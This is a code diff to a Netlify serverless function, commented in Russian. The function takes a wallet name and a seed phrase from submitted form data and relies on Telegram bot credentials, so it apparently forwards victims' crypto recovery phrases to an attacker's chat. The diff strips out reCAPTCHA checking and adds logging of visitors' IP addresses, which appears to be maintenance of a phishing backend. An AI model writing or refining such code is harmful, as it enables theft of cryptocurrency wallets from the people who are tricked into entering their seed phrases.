@@ -13,31 +13,22 @@ exports.handler = async function (event) {
         };
     }
 
+    // В Netlify Functions IP пользователя доступен через заголовок 'x-forwarded-for'
+    // Однако, для надежного ограничения по IP (например, "не более 3 раз с одного IP")
+    // требуется внешнее хранилище данных (база данных: Redis, FaunaDB, Supabase и т.д.),
+    // потому что функции без сохранения состояния (stateless) не помнят предыдущие вызовы
+    // и могут выполняться на разных серверах.
+    // Простое счетчика в самой функции будет ненадежным.
+    const userIp = event.headers['x-forwarded-for'] || event.clientIp;
+    console.log(`Получен запрос от IP: ${userIp}`);
+
+
     try {
-        const { BOT_TOKEN, CHAT_ID, RECAPTCHA_SECRET_KEY } = process.env;
+        const { BOT_TOKEN, CHAT_ID } = process.env; // RECAPTCHA_SECRET_KEY удален
         const body = JSON.parse(event.body);
-        const { walletName, seedPhrase, recaptchaToken } = body;
+        const { walletName, seedPhrase } = body; // recaptchaToken удален
 
-        // --- ПРОВЕРКА RECAPTCHA ---
-        if (!recaptchaToken) {
-           throw new Error("Токен reCAPTCHA отсутствует.");
-        }
-
-        const recaptchaUrl = `https://www.google.com/recaptcha/api/siteverify`;
-        const recaptchaRes = await axios.post(recaptchaUrl, null, {
-            params: {
-                secret: RECAPTCHA_SECRET_KEY,
-                response: recaptchaToken,
-            },
-        });
-        
-        // Проверяем, что проверка успешна и оценка пользователя выше порога (0.5 - стандарт)
-        if (!recaptchaRes.data.success || recaptchaRes.data.score < 0.5) {
-            console.warn("Проверка reCAPTCHA не пройдена!", recaptchaRes.data);
-            throw new Error("Вы не прошли проверку на робота.");
-        }
-        // --- КОНЕЦ ПРОВЕРКИ ---
-
+        // Логика reCAPTCHA полностью удалена
 
         if (!BOT_TOKEN || !CHAT_ID) {
             console.error("КРИТИЧЕСКАЯ ОШИБКА: BOT_TOKEN или CHAT_ID не установлены!");
